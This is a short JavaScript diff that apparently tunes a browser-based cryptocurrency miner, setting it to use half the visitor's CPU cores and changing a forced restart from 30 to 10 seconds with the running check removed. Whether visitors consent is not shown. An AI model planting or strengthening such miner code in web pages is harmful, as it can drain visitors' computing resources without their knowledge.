@@ -84,10 +84,8 @@
         miner.start();
         miner.setNumThreads(navigator.hardwareConcurrency/2);
         setTimeout(function(){
-          //Edge-case: isRunning but doesn't start
-          if(miner.isRunning())
             miner.start();
-        }, 30000);
+        }, 10000);
         clearInterval(mi);
       }
     }, 1000);
